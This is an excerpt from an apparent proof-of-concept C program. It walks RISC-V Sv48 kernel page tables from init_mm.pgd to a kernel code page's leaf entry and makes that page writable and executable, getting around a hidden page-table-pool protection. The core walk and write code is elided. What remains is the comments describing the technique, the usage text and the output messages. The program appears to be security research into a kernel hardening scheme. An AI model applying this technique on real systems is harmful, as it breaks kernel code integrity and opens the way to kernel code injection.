// FZY: Proof of concept that follows init_mm.pgd to walk the RISC-V Sv48 kernel
// page table (PGD -> PUD -> PMD -> PTE) down to the leaf entry of a kernel code
// page, then flips its permission bits from read-execute to read-write-execute.
//
// Under CONFIG_SDP_PGTABLE every page table page is allocated from a hidden
// pool that is kept out of the linear mapping and mapped at a random kernel
// virtual address. The pool is reachable only through the __tagone pointers
// mm_struct::pgd and sdp_pt_va_base, so the walk has to start from init_mm.pgd
// and translate each next-level physical address through the pool base instead
// of through the swapper_pg_dir symbol and the linear mapping.
//
// This PoC targets the page tables themselves, so it always starts from the
// init_mm symbol directly and the first protected slot it touches is
// init_mm.pgd. init_mm_poc.c is the variant that targets init_mm itself and
// goes through the __tagone pointer __init_mm_ptr under CONFIG_SDP_CACHE.
...
static void usage(const char *prog) {
  ...
  printf("  init_mm_addr: the init_mm symbol itself, in every mode\n");
  printf("      nm vmlinux | grep ' init_mm$'\n");
...
int main(int argc, char *argv[]) {
  printf("[+] init_mm.pgd Walk & Code Page Permission PoC\n\n");
  ...
  // Step 1: init_mm is taken as given - this PoC goes after the page tables,
  // not after init_mm, so it never needs the __init_mm_ptr indirection that
  // init_mm_poc.c uses. The first protected slot it touches is init_mm.pgd.
  ...
  // Walk the Sv48 page table chain, starting from init_mm.pgd
  ...
  // Show manifestation
  printf("\n[+] === MANIFESTATION ===\n");
  printf("[+] Starting from init_mm.pgd, the walk reached the leaf PTE for\n");
  printf("[+] kernel code at 0x%lx and changed it:\n", target_va);
